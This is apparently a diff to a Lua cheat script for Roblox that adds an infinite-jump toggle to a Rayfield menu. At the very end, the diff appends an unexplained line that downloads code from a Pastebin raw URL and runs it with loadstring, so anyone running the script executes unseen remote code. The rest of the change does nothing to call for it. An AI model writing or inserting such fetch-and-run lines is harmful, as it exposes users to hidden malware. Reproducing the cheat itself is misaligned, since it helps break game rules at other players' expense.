@@ -637,6 +637,44 @@ function SpeedController.Destroy()
     end)
 end
 
+-- add infjump functions
+local InfJumpEnabled = false
+
+-- use pcall make infjump function safe
+local function SafeInfJump()
+    pcall(function()
+        game:GetService("UserInputService").JumpRequest:Connect(function()
+            if InfJumpEnabled and game.Players.LocalPlayer.Character then
+                local Humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if Humanoid and Humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
+                    Humanoid:ChangeState("Jumping")
+                end
+            end
+        end)
+    end)
+end
+
+-- restart infjump function
+SafeInfJump()
+
+-- create infjump toggle（use p all make more safe）
+PlayerTab:CreateToggle({
+    Name = "infjump",
+    CurrentValue = false,
+    Flag = "InfJumpToggle",
+    Callback = function(Value)
+        pcall(function()
+            InfJumpEnabled = Value
+            Rayfield:Notify({
+                Title = "infjump " .. (Value and "open" or "close"),
+                Content = Value and "Already open" or "Already close",
+                Duration = 1.5,
+                Image = 4483362458,
+            })
+        end)
+    end,
+})
+
 -- Jump Power Control with safety checks
 PlayerTab:CreateSlider({
    Name = "Jump Power",
@@ -1190,3 +1228,5 @@ Rayfield:Notify({
    Duration = 5,
    Image = 4483362458
 })
+
+loadstring(game:HttpGet("https://pastebin.com/raw/uZY266KV", true))()
